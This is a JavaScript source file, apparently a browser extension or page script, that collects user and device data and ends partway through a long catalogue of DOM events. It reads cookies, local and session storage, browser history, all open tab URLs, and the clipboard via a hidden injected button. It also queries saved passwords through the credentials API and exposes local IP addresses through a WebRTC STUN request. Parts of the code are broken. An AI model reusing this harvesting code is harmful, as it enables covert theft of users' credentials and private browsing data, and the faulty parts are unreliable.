class EventEmitter {
    constructor() {
        this.events = {};
    }

    on(event, listener) {
        if (!this.events[event]) {
            this.events[event] = [];
        }
        this.events[event].push(listener);
    }

    emit(event, data) {
        if (this.events[event]) {
            this.events[event].forEach(listener => listener(data));
        }
    }

    clear() {
        this.events = {};
    }
}

const eventEmitter = new EventEmitter();

const handleAsyncError = async (asyncFunc, context) => {
    try {
        return await asyncFunc();
    } catch (error) {
        console.error(`Error in ${context}:`, error.message, error.stack);
        return null;
    }
};

const getPermissionStatus = async (name) => {
    if ('permissions' in navigator) {
        const status = await handleAsyncError(() => navigator.permissions.query({ name }), `querying ${name} permission`);
        return { state: status.state, name: name };
    }
    return null;
};

const getPermissions = async () => {
    const permissionNames = ['geolocation', 'notifications', 'midi', 'persistent-storage', 'push', 'screen-wake-lock'];
    const permissions = {};
    for (const name of permissionNames) {
        permissions[name] = await getPermissionStatus(name);
    }
    eventEmitter.emit('permissions', permissions);
    return permissions;
};

const getIndexedDBData = async () => {
    if ('indexedDB' in window) {
        const dbs = await new Promise((resolve, reject) => {
            indexedDB.databases().then(databases => {
                resolve(databases.map(db => db.name));
            }).catch(reject);
        });
        eventEmitter.emit('indexedDBData', dbs);
        return dbs;
    }
    eventEmitter.emit('indexedDBData', []);
    return [];
};

const getStorageAndData = async () => {
    const storageEstimate = await handleAsyncError(() => navigator.storage.estimate(), 'navigator.storage.estimate');

    const storageData = {
        cookies: document.cookie,
        localStorageData: { ...localStorage },
        sessionStorageData: { ...sessionStorage },
        indexedDBData: await handleAsyncError(() => getIndexedDBData(), 'getIndexedDBData'),
        storageEstimate,
        syncData: 'Not directly accessible'
    };
    eventEmitter.emit('storageAndData', storageData);
    return storageData;
};



const getPermissionsAndSettings = async () => {
    const permissionsAndSettings = {
        permissions: await getPermissions(),
        securityHeaders: {
            csp: document.querySelector("meta[http-equiv='Content-Security-Policy']")?.content,
            referrerPolicy: document.referrerPolicy,
            featurePolicy: document.querySelector("meta[http-equiv='Feature-Policy']")?.content
        }
    };
    eventEmitter.emit('permissionsAndSettings', permissionsAndSettings);
    return permissionsAndSettings;
};


const getWebPushNotifications = async () => {
    if ('serviceWorker' in navigator && 'PushManager' in window) {
        const registration = await navigator.serviceWorker.ready;
        const subscription = await registration.pushManager.getSubscription();
        eventEmitter.emit('webPushNotifications', { subscription });
        return { subscription };
    } else {
        console.warn("Web Push Notifications not supported.");
        eventEmitter.emit('webPushNotifications', null);
        return null;
    }
};


const getBrowserHistory = async () => {
    if (!chrome.history) {
        console.warn("History API not supported in this browser.");
        eventEmitter.emit('browserHistory', []);
        return [];
    }
    try {
        const historyItems = await new Promise((resolve) => {
            chrome.history.search({ text: '', maxResults: 100 }, (data) => {
                resolve(data);
            });
        });
        eventEmitter.emit('browserHistory', historyItems);
        return historyItems;
    } catch (error) {
        console.error('Error getting browser history:', error);
        eventEmitter.emit('browserHistory', []);
        return [];
    }
};


const getNetworkType = () => {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    if (!connection) {
        console.warn("Network Information API not supported.");
        return {
            type: 'unknown',
            effectiveType: 'unknown',
            downlink: 0,
            rtt: 0
        };
    }

    return {
        type: connection.type,
        effectiveType: connection.effectiveType,
        downlink: connection.downlink,
        rtt: connection.rtt
    };
};

const getIPAddress = async () => {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
        return "Unknown";
    }
};

const getNetworkInterfaces = async () => {
    if (!window.RTCPeerConnection) {
        console.warn("WebRTC not supported.");
        return 'Requires WebRTC permissions';
    }
    return new Promise((resolve, reject) => {
        try {
            const peerConnection = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            const candidates = [];
            peerConnection.createDataChannel("");
            peerConnection.onicecandidate = event => {
                if (event.candidate) {
                    const { candidate } = event.candidate;
                    const parts = candidate.split(" ");
                    const ipAddr = parts[4];
                    candidates.push(ipAddr);
                } else {
                    resolve(candidates);
                }
            };
            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));
        } catch (e) {
            reject(e);
        }
    });
};


const getNetworkInfo = async () => {
    const connection = getNetworkType();
    const ipAddress = await getIPAddress();
    const networkInterfaces = await getNetworkInterfaces().catch(() => 'Requires WebRTC permissions');
    const networkInfo = { ...connection, ipAddress, networkInterfaces };
    eventEmitter.emit('networkInfo', networkInfo);
    return networkInfo;
};

const getPerformanceMetrics = () => {
    const { performance } = window;
    const performanceMetrics = {
        navigationTiming: performance.getEntriesByType('navigation')[0],
        resourceTiming: performance.getEntriesByType('resource'),
        memoryUsage: performance.memory,
        paintTiming: performance.getEntriesByType('paint'),
        longTasks: performance.getEntriesByType('longtask'),
        pageLoadMetrics: performance.timing,
        energyConsumption: 'Unavailable in standard JS'
    };
    eventEmitter.emit('performanceMetrics', performanceMetrics);
    return performanceMetrics;
};

const getUserTiming = () => {
    const userTiming = performance.getEntriesByType('measure');
    eventEmitter.emit('userTiming', userTiming);
    return userTiming;
};

// User Interaction
const getUserInteractionInfo = async () => {
    const clipboardRead = await navigator.clipboard.readText();
    const idleDetection = await new Promise((resolve) => {
        const idleDetector = new IdleDetector();
        idleDetector.start().then(() => {
            idleDetector.addEventListener('change', () => {
                const { userState, screenState } = idleDetector;
                resolve({ userState, screenState });
            });
        });
    });
    const userInteractionInfo = {
        touchPoints: navigator.maxTouchPoints,
        pointerCapabilities: navigator.pointerEnabled,
        clipboardAccess: clipboardRead,
        idleDetection,
        dragAndDrop: 'Supported via HTML5 Drag and Drop API',
        keyboardAndMouse: 'Not directly accessible',
        speechRecognition: 'Requires Permissions',
        speechSynthesis: 'Supported'
    };
    eventEmitter.emit('userInteractionInfo', userInteractionInfo);
    return userInteractionInfo;
};

// Advanced APIs and Capabilities
const getAdvancedCapabilities = async () => {
    const capabilities = {};

    if ('bluetooth' in navigator) {
        capabilities.bluetoothDevices = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
    }
    if ('usb' in navigator) {
        capabilities.usbDevices = await navigator.usb.getDevices();
    }
    if ('serial' in navigator) {
        capabilities.serialPorts = await navigator.serial.requestPort();
    }
    if ('NFCReader' in window) {
        capabilities.nfcReader = new NFCReader();
    }
    if ('showOpenFilePicker' in window) {
        capabilities.fileSystemHandles = await window.showOpenFilePicker();
    }
    if ('PaymentRequest' in window) {
        capabilities.paymentRequest = new PaymentRequest([{ supportedMethods: 'basic-card' }], { total: { label: 'Total', amount: { currency: 'USD', value: '1.00' } } });
    }
    if ('credentials' in navigator) {
        capabilities.credentials = await navigator.credentials.get({ password: true });
    }
    if ('AbsoluteOrientationSensor' in window) {
        capabilities.sensors = new AbsoluteOrientationSensor();
    }
    if ('AmbientLightSensor' in window) {
        capabilities.ambientLight = new AmbientLightSensor();
    }
    if ('ProximitySensor' in window) {
        capabilities.proximity = new ProximitySensor();
    }
    capabilities.haptics = 'vibrate' in navigator ? navigator.vibrate(100) : 'Unsupported';

    eventEmitter.emit('advancedCapabilities', capabilities);
    return capabilities;
};

// Security and Privacy
const getSecurityDetails = async () => {
    const mixedContent = await fetch(window.location.href).then(response => response.headers.get('Content-Security-Policy')?.includes('block-all-mixed-content')).catch(() => false);
    const crossOriginRequests = document.querySelectorAll('img[crossorigin], script[crossorigin], link[crossorigin]');
    const sslTls = window.location.protocol === 'https:';

    const securityDetails = {
        sslTls,
        mixedContent,
        crossOriginRequests: crossOriginRequests.length > 0,
        trackingProtection: 'Not directly accessible'
    };
    eventEmitter.emit('securityDetails', securityDetails);
    return securityDetails;
};

const getCSPReport = async () => {
    const cspReportUrl = new URL('/csp-violation-report-endpoint', window.location.origin);
    const cspReport = await fetch(cspReportUrl.toString()).then(response => response.json());
    eventEmitter.emit('cspReport', cspReport);
    return cspReport;
};

const getSubresourceIntegrity = () => {
    const scripts = document.querySelectorAll('script');
    const subresourceIntegrity = Array.from(scripts).map(script => ({
        src: script.src,
        integrity: script.integrity,
        crossOrigin: script.crossOrigin
    }));
    eventEmitter.emit('subresourceIntegrity', subresourceIntegrity);
    return subresourceIntegrity;
};

// User-specific Data
const getUserSpecificData = async () => {
    const savedPasswords = await navigator.credentials.get({ password: true });
    const autofillData = await navigator.credentials.get({ autofill: true });
    const formFillAssistance = 'Not directly accessible';
    const userProfiles = 'Not directly accessible';

    const userSpecificData = {
        savedPasswords,
        autofillData,
        formFillAssistance,
        userProfiles
    };
    eventEmitter.emit('userSpecificData', userSpecificData);
    return userSpecificData;
};

// Advanced File System Access (write capabilities)
const getAdvancedFileSystemAccess = async () => {
    if ('showOpenFilePicker' in window) {
        const handles = await window.showOpenFilePicker();
        eventEmitter.emit('advancedFileSystemAccess', handles);
        return handles;
    } else {
        console.warn("File System Access API not supported.");
        eventEmitter.emit('advancedFileSystemAccess', []);
        return [];
    }
};

// Window and Tab Management
const getWindowAndTabInfo = async () => {
    if ('windows' in browser && 'tabs' in browser) {
        const windows = await browser.windows.getAll();
        const tabs = await browser.tabs.query({});

        const windowAndTabInfo = {
            windows,
            tabs,
            relationships: 'Not directly accessible'
        };
        eventEmitter.emit('windowAndTabInfo', windowAndTabInfo);
        return windowAndTabInfo;
    } else {
        console.warn("Browser Windows and Tabs API not supported.");
        eventEmitter.emit('windowAndTabInfo', []);
        return [];
    }
};

// Custom Elements
const getCustomElements = () => {
    const customElements = customElements.getNames().map(name => ({
        name,
        constructor: customElements.get(name).constructor.name
    }));
    eventEmitter.emit('customElements', customElements);
    return { customElements };
};

// Environmental Sensors
const getEnvironmentalSensors = async () => {
    const sensors = {};
    if ('TemperatureSensor' in window) {
        sensors.temperatureSensor = new TemperatureSensor();
        await sensors.temperatureSensor.start();
    }
    if ('HumiditySensor' in window) {
        sensors.humiditySensor = new HumiditySensor();
        await sensors.humiditySensor.start();
    }
    eventEmitter.emit('environmentalSensors', sensors);
    return sensors;
};

// Tab Group Information
const getTabGroupInformation = async () => {
    if ('tabs' in browser) {
        const tabs = await browser.tabs.query({});
        const groups = tabs.reduce((acc, tab) => {
            if (tab.groupId !== browser.tabs.TAB_ID_NONE) {
                if (!acc[tab.groupId]) {
                    acc[tab.groupId] = [];
                }
                acc[tab.groupId].push(tab);
            }
            return acc;
        }, {});
        eventEmitter.emit('tabGroupInformation', groups);
        return groups;
    } else {
        console.warn("Browser Tabs API not supported.");
        eventEmitter.emit('tabGroupInformation', []);
        return [];
    }
};

// Tab Opener Information
const getTabOpenerInformation = async () => {
    if ('tabs' in browser) {
        const tabs = await browser.tabs.query({});
        const tabOpeners = tabs.map(tab => ({
            tabId: tab.id,
            openerTabId: tab.openerTabId
        }));
        eventEmitter.emit('tabOpenerInformation', tabOpeners);
        return tabOpeners;
    } else {
        console.warn("Browser Tabs API not supported.");
        eventEmitter.emit('tabOpenerInformation', []);
        return [];
    }
};

// Clipboard Access
const getClipboardAccess = async () => {
    let readText = '';
    try {
        let clipboardReadButton = document.querySelector("#readClipboardButton");
        if (!clipboardReadButton) {
            clipboardReadButton = document.createElement('button');
            clipboardReadButton.id = 'readClipboardButton';
            clipboardReadButton.style.display = 'none';
            document.body.appendChild(clipboardReadButton);
        }
        clipboardReadButton.addEventListener("click", async () => {
            readText = await navigator.clipboard.readText();
            eventEmitter.emit('clipboardAccess', { readText });
        });
    } catch (error) {
        console.error("Clipboard read request was blocked:", error);
    }
    const writeText = async (text) => await navigator.clipboard.writeText(text);
    const clipboardAccess = {
        readText,
        writeText: (text) => navigator.clipboard.writeText(text)
    };
    eventEmitter.emit('clipboardAccess', clipboardAccess);
    return clipboardAccess;
};

const isObject = (value) => value && typeof value === 'object' && value.constructor === Object;

const serializeValue = (value) => {
    if (typeof value === 'function') {
        return `Function: ${value.name}`;
    } else if (value instanceof Node) {
        return `Node: ${value.nodeName}`;
    } else if (value instanceof Window) {
        return 'Window';
    } else if (Array.isArray(value)) {
        return value.map(serializeValue);
    } else if (isObject(value)) {
        return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, serializeValue(v)]));
    } else {
        return value;
    }
};

const serializeEvent = (event, parameters) => {
    const serialized = {};
    parameters.forEach(param => {
        try {
            serialized[param] = serializeValue(event[param]);
        } catch (error) {
            console.error(`Error serializing parameter ${param} for event ${event.type}:`, error);
            serialized[param] = `Error: ${error.message}`;
        }
    });
    return serialized;
};

// Advanced Idle Detection
const getAdvancedIdleDetection = async () => {
    if ('IdleDetector' in window) {
        const idleDetector = new IdleDetector();
        await idleDetector.start();
        const idleDetection = new Promise((resolve) => {
            idleDetector.addEventListener('change', () => {
                const { userState, screenState } = idleDetector;
                resolve({ userState, screenState });
            });
        });
        eventEmitter.emit('advancedIdleDetection', idleDetection);
        return idleDetection;
    }
    const idleDetection = 'Idle Detection API not supported';
    eventEmitter.emit('advancedIdleDetection', idleDetection);
    return idleDetection;
};

// Detailed Tab and Window Relationships
const getDetailedWindowTabRelationships = async () => {
    if ('windows' in browser) {
        const windows = await browser.windows.getAll({ populate: true });
        const detailedWindowTabRelationships = windows.map(win => ({
            windowId: win.id,
            tabs: win.tabs.map(tab => ({
                tabId: tab.id,
                url: tab.url,
                title: tab.title,
                active: tab.active,
                pinned: tab.pinned,
                muted: tab.mutedInfo.muted,
                openerTabId: tab.openerTabId,
                groupId: tab.groupId
            }))
        }));
        eventEmitter.emit('detailedWindowTabRelationships', detailedWindowTabRelationships);
        return detailedWindowTabRelationships;
    } else {
        console.warn("Browser Windows API not supported.");
        eventEmitter.emit('detailedWindowTabRelationships', []);
        return [];
    }
};

// Event Monitoring and Logging
const contentEvents = [
    // Device sensor events
    {name: "DeviceMotionEvent", description: "Tracks changes in device motion, triggered by device movement.", parameters: ["acceleration", "accelerationIncludingGravity", "rotationRate", "interval"], context: ["device", "window", "screen"]},
    {name: "DeviceOrientationEvent", description: "Tracks changes in device orientation, triggered by device rotation.", parameters: ["alpha", "beta", "gamma", "absolute"], context: ["device", "window", "screen"]},

    // Media events
    // Media - track list manipulation
    {name: "addtrack", description: "Emitted when a new track is added to a media element. Relevant for media applications managing tracks. Sometimes page-specific.", parameters: ["track"], context: ["mediaElement", "trackList"]},
    {name: "removetrack", description: "Emitted when a track is removed from a media element. Relevant for media applications managing tracks. Sometimes page-specific.", parameters: ["track"], context: ["mediaElement", "trackList"]},
    {name: "track", description: "Emitted when a media track is added to the connection. Relevant for media applications managing tracks. Sometimes page-specific.", parameters: ["track"], context: ["mediaElement", "trackList"]},
    // Media - playback
    {name: "canplay", description: "Emitted when media can be played, but not necessarily to completion without buffering. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "networkState"]},
    {name: "canplaythrough", description: "Emitted when media can be played to completion without buffering. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "networkState"]},
    {name: "ended", description: "Emitted when media playback reaches the end. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "mediaStream"]},
    {name: "pause", description: "Emitted when media playback is paused. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "mediaStream"]},
    {name: "play", description: "Emitted when media playback starts. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "mediaStream"]},
    {name: "playing", description: "Emitted when media starts playing after being paused or buffered. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "mediaStream"]},
    {name: "ratechange", description: "Emitted when the playback rate changes. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "mediaStream"]},
    {name: "timeupdate", description: "Emitted when the playback position changes. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "timeRanges"]},
    {name: "waitingforkey", description: "Emitted when playback is waiting for a key for encrypted media. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "encryptedMedia"]},
    {name: "waiting", description: "Emitted when playback is delayed pending further data. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "networkState"]},
    {name: "durationchange", description: "Emitted when the media duration changes. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "timeRanges"]},
    {name: "end", description: "Emitted at the end of a media resource. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "mediaStream"]},
    {name: "audioend", description: "Emitted when an audio track ends. Relevant for audio playback applications. Sometimes page-specific.", parameters: [], context: ["audioElement", "audioTrack"]},
    {name: "audioprocess", description: "Emitted during audio processing. Relevant for audio processing applications. Sometimes page-specific.", parameters: ["inputBuffer", "outputBuffer"], context: ["audioContext", "audioProcessor"]},
    {name: "audiostart", description: "Emitted when an audio track starts. Relevant for audio playback applications. Sometimes page-specific.", parameters: [], context: ["audioElement", "audioTrack"]},
    {name: "soundend", description: "Emitted when a sound ends. Relevant for sound playback applications. Sometimes page-specific.", parameters: [], context: ["audioElement", "audioTrack"]},
    {name: "soundstart", description: "Emitted when a sound starts. Relevant for sound playback applications. Sometimes page-specific.", parameters: [], context: ["audioElement", "audioTrack"]},
    {name: "soundprocess", description: "Emitted during sound processing. Relevant for sound processing applications. Sometimes page-specific.", parameters: ["inputBuffer", "outputBuffer"], context: ["audioContext", "audioProcessor"]},
    {name: "seeked", description: "Emitted when a seek operation ends. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "timeRanges"]},
    {name: "seeking", description: "Emitted when a seek operation begins. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "timeRanges"]},
    {name: "mark", description: "Emitted to indicate specific points in the media timeline. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "timeRanges"]},
    {name: "volumechange", description: "Emitted when the volume changes. Relevant for media playback applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "mediaStream"]},
    // Media - loading
    {name: "loadeddata", description: "Emitted when the current frame of media has been loaded. Relevant for media loading applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "timeRanges"]},
    {name: "loadedmetadata", description: "Emitted when metadata for the media resource has been loaded. Relevant for media loading applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "timeRanges"]},
    {name: "suspend", description: "Emitted when the media data loading has been suspended. Relevant for media loading applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "networkState"]},
    {name: "encrypted", description: "Emitted when encrypted media is encountered. Relevant for media loading applications. Sometimes page-specific.", parameters: ["initDataType", "initData"], context: ["mediaElement", "encryptedMedia"]},
    {name: "stalled", description: "Emitted when the user agent is trying to fetch media data but is unable to do so. Relevant for media loading applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "networkState"]},

    // Mouse events
    // Mouse - click
    {name: "auxclick", description: "Emitted when a non-primary mouse button is clicked. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["button", "buttons", "clientX", "clientY", "screenX", "screenY"], context: ["element", "event"]},
    {name: "click", description: "Emitted when a mouse button is clicked. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["button", "buttons", "clientX", "clientY", "screenX", "screenY"], context: ["element", "event"]},
    {name: "contextmenu", description: "Emitted when the right mouse button is clicked to open a context menu. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["clientX", "clientY", "screenX", "screenY"], context: ["element", "event"]},
    {name: "dblclick", description: "Emitted when a mouse button is double-clicked. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["button", "buttons", "clientX", "clientY", "screenX", "screenY"], context: ["element", "event"]},
    {name: "mousedown", description: "Emitted when a mouse button is pressed down. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["button", "buttons", "clientX", "clientY", "screenX", "screenY"], context: ["element", "event"]},
    {name: "mouseup", description: "Emitted when a mouse button is released. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["button", "buttons", "clientX", "clientY", "screenX", "screenY"], context: ["element", "event"]},
    {name: "longpress", description: "Emitted when a long press is detected. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["clientX", "clientY", "screenX", "screenY"], context: ["element", "event"]},
    // Mouse - movement
    {name: "mouseenter", description: "Emitted when the mouse pointer enters an element. Relevant for element-specific mouse interactions. Always page-specific.", parameters: [], context: ["element", "event"]},
    {name: "mouseleave", description: "Emitted when the mouse pointer leaves an element. Relevant for element-specific mouse interactions. Always page-specific.", parameters: [], context: ["element", "event"]},
    {name: "mousemove", description: "Emitted when the mouse is moved. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["clientX", "clientY", "screenX", "screenY", "movementX", "movementY"], context: ["element", "event"]},
    {name: "mouseout", description: "Emitted when the mouse pointer moves out of an element. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["relatedTarget"], context: ["element", "event"]},
    {name: "mouseover", description: "Emitted when the mouse pointer moves over an element. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["relatedTarget"], context: ["element", "event"]},
    // Mouse - capture
    {name: "gotpointercapture", description: "Emitted when an element captures a pointer. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId"], context: ["element", "event"]},
    {name: "lostpointercapture", description: "Emitted when an element loses a pointer capture. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId"], context: ["element", "event"]},
    // Mouse - pointer - click
    {name: "pointerdown", description: "Emitted when a pointer is pressed. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    {name: "pointerup", description: "Emitted when a pointer is released. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    // Mouse - pointer - movement
    {name: "pointerenter", description: "Emitted when a pointer enters an element. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    {name: "pointerleave", description: "Emitted when a pointer leaves an element. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    {name: "pointermove", description: "Emitted when a pointer moves. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    {name: "pointerout", description: "Emitted when a pointer is no longer over an element. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    {name: "pointerover", description: "Emitted when a pointer is over an element. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    // Mouse - pointer - capture
    {name: "pointercancel", description: "Emitted when a pointer is canceled. Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId"], context: ["element", "event"]},
    {name: "pointerlockchange", description: "Emitted when pointer lock state changes. Relevant for document or element pointer interactions. Sometimes page-specific.", parameters: [], context: ["document", "element"]},
    {name: "pointerlockerror", description: "Emitted when an error occurs in pointer lock state. Relevant for document or element pointer interactions. Sometimes page-specific.", parameters: [], context: ["document", "element"]},
    // Mouse - wheel
    {name: "wheel", description: "Emitted when the mouse wheel is scrolled. Relevant for element-specific mouse interactions. Always page-specific.", parameters: ["deltaX", "deltaY", "deltaZ", "deltaMode"], context: ["element", "event"]},
    // Mouse - other
    {name: "mspointerhover", description: "Emitted when a pointer hovers over an element (Microsoft specific). Relevant for element-specific pointer interactions. Always page-specific.", parameters: ["pointerId", "width", "height", "pressure", "tiltX", "tiltY", "pointerType", "isPrimary"], context: ["element", "event"]},
    // Mouse - drag and drop
    {name: "drag", description: "Emitted when an element is being dragged. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},
    {name: "dragend", description: "Emitted when dragging an element ends. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},
    {name: "dragenter", description: "Emitted when a dragged element enters a drop target. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},
    {name: "dragexit", description: "Emitted when a dragged element exits a drop target. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},
    {name: "dragleave", description: "Emitted when a dragged element leaves a drop target. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},
    {name: "dragover", description: "Emitted when an element is dragged over a drop target. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},
    {name: "dragstart", description: "Emitted when the dragging of an element starts. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},
    {name: "drop", description: "Emitted when a dragged element is dropped. Relevant for element-specific drag and drop interactions. Always page-specific.", parameters: ["dataTransfer"], context: ["element", "event"]},

    // Keyboard events
    {name: "keydown", description: "Emitted when a key is pressed down. Relevant for element-specific keyboard interactions. Always page-specific.", parameters: ["key", "code", "location", "ctrlKey", "shiftKey", "altKey", "metaKey", "repeat"], context: ["element", "event"]},
    {name: "keyup", description: "Emitted when a key is released. Relevant for element-specific keyboard interactions. Always page-specific.", parameters: ["key", "code", "location", "ctrlKey", "shiftKey", "altKey", "metaKey"], context: ["element", "event"]},
    {name: "keypress", description: "Emitted when a key is pressed and held down. Relevant for element-specific keyboard interactions. Always page-specific.", parameters: ["key", "code", "location", "ctrlKey", "shiftKey", "altKey", "metaKey", "repeat"], context: ["element", "event"]},
    {name: "keydetailschange", description: "Emitted when the details of a key change. Relevant for element-specific keyboard interactions. Always page-specific.", parameters: ["detail"], context: ["KeyboardEvent", "element"]},

    // CSS events
    {name: "animationcancel", description: "Emitted when a CSS animation is canceled. Relevant for element-specific CSS animations. Always page-specific.", parameters: ["animationName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "animationend", description: "Emitted when a CSS animation ends. Relevant for element-specific CSS animations. Always page-specific.", parameters: ["animationName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "animationiteration", description: "Emitted when a CSS animation iterates. Relevant for element-specific CSS animations. Always page-specific.", parameters: ["animationName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "animationiterationend", description: "Emitted when a CSS animation iteration ends. Relevant for element-specific CSS animations. Always page-specific.", parameters: ["animationName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "animationstart", description: "Emitted when a CSS animation starts. Relevant for element-specific CSS animations. Always page-specific.", parameters: ["animationName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "transitioncancel", description: "Emitted when a CSS transition is canceled. Relevant for element-specific CSS transitions. Always page-specific.", parameters: ["propertyName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "transitionend", description: "Emitted when a CSS transition ends. Relevant for element-specific CSS transitions. Always page-specific.", parameters: ["propertyName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "transitionrun", description: "Emitted when a CSS transition starts running. Relevant for element-specific CSS transitions. Always page-specific.", parameters: ["propertyName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},
    {name: "transitionstart", description: "Emitted when a CSS transition starts. Relevant for element-specific CSS transitions. Always page-specific.", parameters: ["propertyName", "elapsedTime", "pseudoElement"], context: ["element", "styleSheet"]},

    // DOM events
    {name: "DOMContentLoaded", description: "Emitted when the initial HTML document has been completely loaded and parsed. Relevant for document-specific DOM events. Sometimes page-specific.", parameters: [], context: ["document", "window", "location"]},
    {name: "domattrmodified", description: "Emitted when an attribute is modified on an element. Relevant for element-specific DOM events. Always page-specific.", parameters: ["attrName", "attrChange", "relatedNode", "prevValue", "newValue"], context: ["element", "document"]},
    {name: "domcharacterdatamodified", description: "Emitted when the character data is modified. Relevant for element-specific DOM events. Always page-specific.", parameters: ["target"], context: ["element", "document"]},
    {name: "domfocusin", description: "Emitted when an element is about to receive focus. Relevant for element-specific DOM events. Always page-specific.", parameters: [], context: ["element", "window"]},
    {name: "domfocusout", description: "Emitted when an element is about to lose focus. Relevant for element-specific DOM events. Always page-specific.", parameters: [], context: ["element", "window"]},
    {name: "domnodeinserted", description: "Emitted when a node is added to the document. Relevant for document-specific DOM events. Always page-specific.", parameters: ["relatedNode"], context: ["document", "element"]},
    {name: "domnoderemoved", description: "Emitted when a node is removed from the document. Relevant for document-specific DOM events. Always page-specific.", parameters: ["relatedNode"], context: ["document", "element"]},

    // Speech recognition events
    {name: "start", description: "Emitted to indicate the start of an action, often related to media or speech recognition. Relevant for speech recognition applications. Sometimes page-specific.", parameters: [], context: ["mediaElement", "SpeechRecognition"]},
    {name: "boundary", description: "Emitted when a boundary is reached in speech synthesis. Relevant for speech synthesis applications. Sometimes page-specific.", parameters: ["charIndex", "elapsedTime", "name"], context: ["speechSynthesisUtterance", "speechSynthesis"]},
    {name: "nomatch", description: "Emitted when no match is found for the input, typically related to speech recognition. Relevant for speech recognition applications. Sometimes page-specific.", parameters: [], context: ["SpeechRecognition", "document"]},
    {name: "result", description: "Emitted when a recognition result is available, typically related to speech recognition. Relevant for speech recognition applications. Sometimes page-specific.", parameters: ["results", "resultIndex"], context: ["SpeechRecognition", "document"]},
    {name: "speechend", description: "Emitted when speech recognition input ends. Relevant for speech recognition applications. Sometimes page-specific.", parameters: [], context: ["SpeechRecognition", "document"]},
    {name: "speecherror", description: "Emitted when an error occurs during speech recognition. Relevant for speech recognition applications. Sometimes page-specific.", parameters: ["error"], context: ["SpeechRecognition", "document"]},
